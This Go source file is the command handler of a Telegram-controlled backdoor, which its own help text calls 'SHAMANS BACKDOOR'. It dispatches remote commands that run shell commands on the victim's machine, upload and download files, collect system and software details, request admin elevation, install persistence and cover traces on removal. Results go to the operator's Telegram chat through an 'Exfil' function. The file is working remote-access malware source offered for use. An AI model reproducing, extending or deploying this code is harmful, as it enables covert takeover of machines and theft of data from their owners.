package commands

import (
	"fmt"
	"log"
	"strings"
	"sync"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	gryphon "github.com/whiterabb17/gryphon"
	"github.com/whiterabb17/shaman/package/api"
	"github.com/whiterabb17/shaman/package/install"
	"github.com/whiterabb17/shaman/package/roots"
	"github.com/whiterabb17/shaman/package/util"
)

const (
	Help string = "\t\t      <b>SHAMANS BACKDOOR</b>\n" +
		"<i>help</i> - display this help message\n" +
		"<i>ping</i> - measure the latency of command execution\n" +
		"<i>gryphon</i> [<b>command</b> <b>args</b>] - execute Gryphon command w/out arguments\n" +
		"<i>spirit</i> [<b>arg</b>] - Spin up spirit listener & shut down Callback API\n" +
		"<i>reset</i> - create a new Summoning message\n" +
		"<i>info</i> - display system information\n" +
		"<i>soft</i> - display the list of installed programs\n" +
		"<i>sh</i> - execute a command and return the output\n" +
		"<i>up</i> - upload a file from the local system\n" +
		"<i>dl</i> - download a file from a url to the local system\n" +
		"<i>root</i> - ask for admin permissions\n" +
		"<i>inst</i> - returns instance informtaion\n" +
		"<i>remove</i> - uninstall Shaman bin & persistence \n\n" +
		"<b>To Execute a command use the following format</b>\n" +
		"\t<i>format:</i> command arg1 arg2 >>`botidentifier`\n" +
		"\t<i>eg1 [send to a bot]</i>examplebot> gryphon dnslookup google.com\n" +
		"\t<i>eg2 [send to all]</i> gryphon dnslookup google.com"
	fmtUninstall = "Removing all traces of Shaman...\n```\nService:   %v\nTask:      %v\nRegistry:  %v\nShortcut:  %v\n" +
		"Exclusion: %v\n\nBye!\n```"
	unknown = "[<b>!</b>] Unknown Command"
)

// command => sockets event | args => arguments supplied for commands
// argCount => the amounnt of arguments being parsed | tag => Client to run
// func Dispatcher(command string, args []string, argCount int, tag string) error {
// 	var argStr string
// 	for _, a := range args {
// 		argStr = a + " "
// 	}
// 	cChan, err := cloud.Keeper.GetChannel(tag)
// 	if err != nil {
// 		log.Println(err)
// 		api.Exfil(err.Error())
// 	}
// 	er := cChan.Emit("exec", cloud.Dispatch{Cmd: util.Tb64(command), Args: util.Tb64(argStr), ArgCnt: strconv.Itoa(argCount), Tag: tag})
// 	return er
// }

func ManagerSwitch(command string) {
	var cmd string
	var vars []string
	if strings.Contains(command, " ") {
		vars = strings.Split(command, " ")
		cmd = strings.TrimSpace(vars[0])
	} else {
		cmd = command
		vars = append(vars, "")
	}
	switch strings.ToLower(cmd) {
	case "help":
		api.Exfil(Help)
	case "ping":
		Ping()
	case "allhistory":
		data, err := gryphon.ReadFile("CMD.History_Debug.Log")
		if err != nil {
			api.Exfil("[<b>ERROR</b>] " + err.Error())
		} else {
			api.Exfil(data)
		}
	case "exechistory":
		data, err := gryphon.ReadFile("CMD.Exec_Debug.Log")
		if err != nil {
			api.Exfil("[<b>ERROR</b>] " + err.Error())
		} else {
			api.Exfil(data)
		}
	case "rebroadhistory":
		data, err := gryphon.ReadFile("CMD.Rebroadcast_Debug.Log")
		if err != nil {
			api.Exfil("[<b>ERROR</b>] " + err.Error())
		} else {
			api.Exfil(data)
		}
		/*
			case "gryphon":
				if util.Dbg {
					log.Println(vars)
				}
				GSwitch(vars)
			case "spirit":
				cloud.CreateCloudNode()
		*/
	case "evolve":
		wgg := &sync.WaitGroup{}
		wgg.Add(1)
		roots.Regrowth(vars[0], wgg)
		wgg.Wait()
	case "reset":
		api.NewGenesis()
	case "info":
		api.Exfil(Info())
	case "up":
		UploadFile(vars[0])
	case "dl":
		Download(vars[0])
	}
	// 	/*
	// 		case "soft":
	// 			Software()
	// 		case "sh":
	// 			var scmd string
	// 			for _, s := range vars {
	// 				scmd = s + " "
	// 			}
	// 			if util.Dbg {
	// 				log.Println("Command: " + scmd)
	// 			}
	// 			Shell(scmd)
	// 	*/
}

// Command Switch
func CMDSwitch(command string, vars []string, tag string, full string) {
	if util.Dbg {
		log.Println("Switch Recieved: " + command)
	}
	if tag == "" || tag == util.ID {
		switch strings.ToLower(command) {
		case "help":
			Exfil(Help)
		case "ping":
			Ping()
		case "allhistory":
			data, err := gryphon.ReadFile("CMD.History_Debug.Log")
			if err != nil {
				Exfil("[<b>ERROR</b>] " + err.Error())
			} else {
				Exfil(data)
			}
		case "exechistory":
			data, err := gryphon.ReadFile("CMD.Exec_Debug.Log")
			if err != nil {
				Exfil("[<b>ERROR</b>] " + err.Error())
			} else {
				Exfil(data)
			}
		case "rebroadhistory":
			data, err := gryphon.ReadFile("CMD.Rebroadcast_Debug.Log")
			if err != nil {
				Exfil("[<b>ERROR</b>] " + err.Error())
			} else {
				Exfil(data)
			}
		case "gryphon":
			if util.Dbg {
				log.Println(vars)
			}
			GSwitch(vars)
		case "evolve":
			wgg := &sync.WaitGroup{}
			wgg.Add(1)
			roots.Regrowth(vars[0], wgg)
			wgg.Wait()
		case "reset":
			api.NewGenesis()
		case "info":
			api.Exfil(Info())
		case "soft":
			Software()
		case "sh":
			var scmd string
			for _, s := range vars {
				scmd = s + " "
			}
			if util.Dbg {
				log.Println("Command: " + scmd)
			}
			Shell(scmd)
		case "up":
			UploadFile(vars[0])
		case "dl":
			Download(vars[0])
		case "persist":
			if !install.IsInstalled() {
				install.Install()
			}
		case "root":
			Elevate()
		case "inst":
			InstanceInfo()
		case "remove":
			d := install.Uninstall()
			b := make([]interface{}, len(d))
			for i := range d {
				b[i] = d[i]
			}
			resp := fmt.Sprintf(fmtUninstall, b...)
			log.Println(resp)
			msg := tgbotapi.NewMessage(util.ChatID, resp)
			msg.ParseMode = "Markdown"
			msg.Text = resp
			api.Bot.Send(msg)
			//Exfil(resp)
		default:
			api.Exfil("[<b>!</b>] Unknown Command...\n\n" + Help)
		}
	} else {
		Exfil(full)
	}
}

func Exfil(message string) {
	msg := tgbotapi.NewMessage(util.ChatID, message)
	msg.ParseMode = "Markdown"
	msg.Text = message
	api.Bot.Send(msg)
}

/*
// HelpHandler
func HelpHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	c.SendMessage("[!] Unknown Command...\n\n" + help)
	return nil
}

// UnknownHandler
func UnknownHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	c.SendMessage(unknown)
	return nil
}

// EvolveHandler
func EvolveHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	wgg := &sync.WaitGroup{}
	wgg.Add(1)
	roots.Regrowth(u.Message.Text, wgg)
	wgg.Wait()
	return nil
}

// UninstallHandler
func UninstallHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	d := install.Uninstall()
	b := make([]interface{}, len(d))
	for i := range d {
		b[i] = d[i]
	}
	resp := fmt.Sprintf(fmtUninstall, b...)
	c.SendMessage(resp)
	return nil
}

// GrypHandler
func GrypHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	msg := strings.Replace(u.Message.Text, "/"+u.Message.GetCommand(), "", 1)
	args := strings.TrimSpace(strings.Split(msg, "::")[0])
	GSwitch(args, c)
	//GSwitch(u.Message.Text, c)
	return nil
}

// ListHandler
func ListHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	c.SendMessage("Identity: " + util.ID + "\n")
	return nil
}

// SoftHandler
func SoftHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	Software(c)
	return nil
}

// InstHandler
func InstHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	InstanceInfo(c)
	return nil
}

// UploadHandler
func UploadHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	UploadFile(u.Message.Text, c)
	return nil
}

// PingHandler
func PingHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	Ping(c)
	return nil
}

// ShellHandler
func ShellHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	Shell(u.Message.Text, c)
	return nil
}

// DlHandler
func DlHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	Download(u.Message.Text, c)
	return nil
}

// InfoHandler
func InfoHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	c.SendMessage(Info())
	return nil
}

// ElevateHandler
func ElevateHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	Elevate(c)
	return nil
}

// PersistHandler
func PersistHandler(u api.Update, c telego.Conversation) telego.FlowStep {
	if !install.IsInstalled() {
		util.TelCli = c
		install.Install()
	}
	return nil
}
*/
// CheckTag  return
// bool ? true : false (Whether its a manager command [true] or not [false] - bot command)
func ProcessMsg(message string) (bool, string, []string, int, string) {
	manager := true
	var command string
	var variables []string
	var tag string
	var msg string
	if util.Dbg {
		log.Println("Processing Message: " + message)
	}
	if strings.Contains(message, ">") {
		tag = strings.Split(message, ">")[0]
		msg = strings.Split(message, "> ")[1]
	} else {
		msg = message
	}
	if strings.Contains(msg, " ") {
		command = strings.TrimSpace(strings.Split(msg, " ")[0])
		_variables := strings.Split(strings.Replace(msg, command+" ", "", 1), " ")
		for _, s := range _variables {
			if s != "" {
				variables = append(variables, s)
			}
		}
	} else {
		command = strings.TrimSpace(strings.ToLower(msg))
		variables = append(variables, "")
	}
	return manager, command, variables, len(variables), tag
}
